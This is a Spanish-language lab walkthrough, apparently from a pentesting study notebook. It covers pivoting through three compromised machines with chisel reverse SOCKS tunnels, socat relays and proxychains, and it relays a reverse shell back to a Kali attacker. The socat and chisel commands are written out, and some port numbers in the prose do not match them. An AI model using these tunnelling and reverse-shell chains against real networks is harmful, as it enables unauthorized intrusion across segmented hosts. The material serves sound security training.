Ahora en la máquina 2 tenemos que traernos el chisel, por lo que lo compartimos desde la máquina 1:
![[Pasted image 20230824102012.png]]
Nos lo bajamos en la máquina 2:
![[Pasted image 20230824102056.png]]
Y ahora lo que debemos hacer es configurar el socat en la máquina 1 para decir que todo el tráfico que venga por el puerto 3333 (por ejemplo), lo envíe al chisel de la máquina Kali:
```bash
./socat tcp-l:2222,fork,reuseaddr tcp:10.10.10.12:1234
```
![[Pasted image 20230825160048.png]]
Por tanto ahora, desde la máquina 2 tenemos que ejecutar el chisel enviando el tráfico a la máquina 1 por el puerto 3333 que a su vez enviará este tráfico al kali donde está el chisel escuchando, creando un nuevo túnel por el puerto 8888:
```bash
./chisel client 20.20.20.13:2222 R:8888:socks
```
![[Pasted image 20230825160115.png]]
Y en el kali habremos recibido la conexión para poder llegar a la máquina 3:
![[Pasted image 20230824103919.png]]
De tal forma que ahora si en la máquina 3 montamos un servidor http con python, podremos visualizarlo en la máquina atacante, pero para ello tenemos que añadir este nuevo túnel a la configuración del proxychain:
![[Pasted image 20230824104152.png]]
![[Pasted image 20230824104046.png]]
Vamos a crear el servidor http en la máquina 3:
![[Pasted image 20230824104431.png]]
En el navegador ponemos el nuevo túnel:
![[Pasted image 20230824104518.png]]
Y podemos ver su puerto 80:
![[Pasted image 20230824104540.png]]
Pero si desde esta máquina 3 intentamos enviarnos una reverse shell, no vamos a poder, por lo que debemos enviar socat y chisel a esta máquina 3, por tanto primero nos lo compartimos desde la máquina 1 a la 2:
![[Pasted image 20230824105056.png]]
Y ahora de la máquina 2 nos compartimos socat y chisel con la máquina 3:
![[Pasted image 20230824105244.png]]
Una vez hecho esto, tenemos que ejecutar socat en cada una de las máquinas, de tal forma que diremos en la máquina 1 que todo el tráfico recibido por el puerto 2222 lo envíe a la máquina kali por el puerto 446:
![[Pasted image 20230824110228.png]]
Después hacemos lo mismo en la máquina 2, diciendo que todo el tráfico recibido por el puerto 2222 lo envíe al puerto 2222 de la máquina 1:
![[Pasted image 20230824110256.png]]
Y ahora desde la máquina 3 es cuando podemos decir que envíe la reverse shell por el puerto 2222 a la máquina 2, que a su vez esta la enviará a la máquina 1 y esta a la atacante:
![[Pasted image 20230824110332.png]]
Y habremos recibido conexión de la máquina 3 a la máquina kali:
![[Pasted image 20230824110400.png]]
